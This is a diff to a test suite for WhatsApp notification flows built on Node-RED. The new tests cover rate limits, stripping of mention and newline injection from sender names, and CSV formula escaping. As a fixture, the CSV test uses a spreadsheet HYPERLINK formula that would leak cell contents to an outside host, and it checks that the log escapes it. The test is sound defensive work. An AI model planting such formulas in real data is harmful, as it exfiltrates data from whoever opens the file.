@@ -41,6 +41,8 @@ interface Edges {
   httpStub?: string;
   /** The 30 second wait is replaced by a pass-through. */
   skipDelay?: boolean;
+  /** Replaces the placeholder site name of the website flow. */
+  site?: string;
   /** The value of the ALERT_TOKEN variable of the tab (the examples ship it empty). */
   token?: string;
   /** API answers. A function gets the call. */
@@ -100,7 +102,11 @@ async function start(file: string, edges: Edges = {}): Promise<Running> {
       flow.push({ id: node.id, type: 'helper', z: node.z });
       continue;
     }
-    if (node.type === 'delay' && edges.skipDelay && node.pauseType === 'delay') {
+    if (node.type === 'function' && edges.site && typeof node.func === 'string') {
+      flow.push({ ...node, func: node.func.replace("'your-site.example'", `'${edges.site}'`) });
+      continue;
+    }
+    if (node.type === 'delay' && (node.pauseType === 'rate' || (edges.skipDelay && node.pauseType === 'delay'))) {
       flow.push({ ...node, type: 'function', func: 'return msg;', outputs: 1, noerr: 0, timeout: 0, initialize: '', finalize: '', libs: [] });
       continue;
     }
@@ -389,6 +395,7 @@ describe('example flows run on the real nodes', () => {
   describe('website-down-alert', () => {
     it('sends one message when the site fails and one when it recovers, nothing in between', async () => {
       const run = await start('website-down-alert-on-whatsapp.json', {
+        site: 'shop.example',
         httpStub: "msg.statusCode = flow.get('code') ?? 200; return msg;",
       });
       const stub = () => helper.getNode(run.byName('check the site').id).context().flow;
@@ -398,23 +405,31 @@ describe('example flows run on the real nodes', () => {
       stub().set('code', 503);
       run.fireInject();
       await until(() => run.calls.length === 1, 'the down message');
-      expect(textOf(run.calls[0])).toBe('your-site.example is DOWN (HTTP 503).');
+      expect(textOf(run.calls[0])).toBe('shop.example is DOWN (HTTP 503).');
       run.fireInject();
       await settle();
       expect(run.calls).toHaveLength(1); // still down: silent
       stub().set('code', 200);
       run.fireInject();
       await until(() => run.calls.length === 2, 'the recovery message');
-      expect(textOf(run.calls[1])).toMatch(/^your-site\.example is back after \d+ minutes\.$/);
+      expect(textOf(run.calls[1])).toMatch(/^shop\.example is back after \d+ minutes\.$/);
     });
 
     it('treats a connection error like a failure', async () => {
       const run = await start('website-down-alert-on-whatsapp.json', {
+        site: 'shop.example',
         httpStub: "throw new Error('connect ECONNREFUSED');",
       });
       run.fireInject();
       await until(() => run.calls.length === 1, 'the down message');
-      expect(textOf(run.calls[0])).toBe('your-site.example is DOWN (Error: connect ECONNREFUSED).');
+      expect(textOf(run.calls[0])).toBe('shop.example is DOWN (Error: connect ECONNREFUSED).');
+    });
+
+    it('sends nothing until the site name is set, so a first deploy cannot message the placeholder number', async () => {
+      const run = await start('website-down-alert-on-whatsapp.json', { httpStub: 'msg.statusCode = 503; return msg;' });
+      run.fireInject();
+      await settle();
+      expect(run.calls).toHaveLength(0);
     });
   });
 
@@ -516,6 +531,63 @@ describe('example flows run on the real nodes', () => {
       await until(() => run.calls.length === 2, 'send and status');
       await settle();
       expect(run.calls).toHaveLength(2);
+    });
+  });
+
+  describe('abuse limits', () => {
+    const FLOWS_WITH_A_RATE_NODE = [
+      'reply-to-an-incoming-whatsapp-message.json',
+      'whatsapp-after-hours-auto-reply.json',
+      'whatsapp-menu-by-keyword.json',
+      'share-your-store-location-on-whatsapp.json',
+      'incoming-whatsapp-messages-to-a-team-group.json',
+    ];
+    it.each(FLOWS_WITH_A_RATE_NODE)('%s paces its sends: a delay set to one message every 10 seconds sits right before the send node', (file) => {
+      const nodes = JSON.parse(readFileSync(join(ROOT, 'examples', file), 'utf8')) as Array<Record<string, unknown> & { wires?: string[][] }>;
+      const send = nodes.find((n) => n.type === 'turbo-notify-send');
+      const rate = nodes.find((n) => n.type === 'delay' && n.pauseType === 'rate');
+      expect(send).toBeDefined();
+      expect(rate).toBeDefined();
+      expect(rate?.rate).toBe('1');
+      expect(rate?.nbRateUnits).toBe('10');
+      expect(rate?.wires).toEqual([[send?.id]]);
+      const feeders = nodes.filter((n) => n.wires?.some((out) => out.includes(String(send?.id))));
+      expect(feeders.map((n) => n.id)).toEqual([rate?.id]);
+    });
+
+    it('the team group gets at most 5 forwards an hour from one person and 20 in all, and a stranger cannot ping the team', async () => {
+      const run = await start('incoming-whatsapp-messages-to-a-team-group.json');
+      run.deliver(incoming('@5511977776661 @5511977776662 urgent', { from: { name: 'Eve\n*boom*', number: '12025550142' } }));
+      await until(() => run.calls.length === 1, 'the forward');
+      const text = textOf(run.calls[0]);
+      expect(text).not.toMatch(/@\d/);
+      expect(text).not.toContain('\n');
+      for (let minute = 1; minute < 8; minute += 1) {
+        run.deliver(incoming('again', {}, `2026-06-08T10:0${minute}:00`));
+      }
+      await until(() => run.calls.length === 5, 'five forwards');
+      await settle();
+      expect(run.calls).toHaveLength(5);
+      for (let n = 0; n < 30; n += 1) {
+        run.deliver(incoming('hello', { from: { name: `P${n}`, number: `1202555${String(1000 + n)}` } }, '2026-06-08T10:30:00'));
+      }
+      await until(() => run.calls.length >= 20, 'the group cap');
+      await settle();
+      expect(run.calls).toHaveLength(20);
+    });
+
+    it('a name with an at sign and digits is not echoed as a mention by the reply flow', async () => {
+      const run = await start('reply-to-an-incoming-whatsapp-message.json');
+      run.deliver(incoming('hi', { from: { name: '@5511977776661', number: '12025550142' } }));
+      await until(() => run.calls.length === 1, 'the answer');
+      expect(textOf(run.calls[0])).not.toMatch(/@\d/);
+    });
+
+    it('the CSV log keeps a message that starts like a spreadsheet formula as text', async () => {
+      const run = await start('log-incoming-whatsapp-messages-to-a-file.json');
+      run.deliver(incoming('=HYPERLINK("http://e.io/?"&A2,"x")', { from: { name: '+cmd', number: '12025550142' } }));
+      await until(() => run.captured.length === 1, 'one line');
+      expect(run.captured[0]).toBe(`"2026-06-08T10:00:00","main","12025550142","'+cmd","text","'=HYPERLINK(""http://e.io/?""&A2,""x"")"`);
     });
   });
 
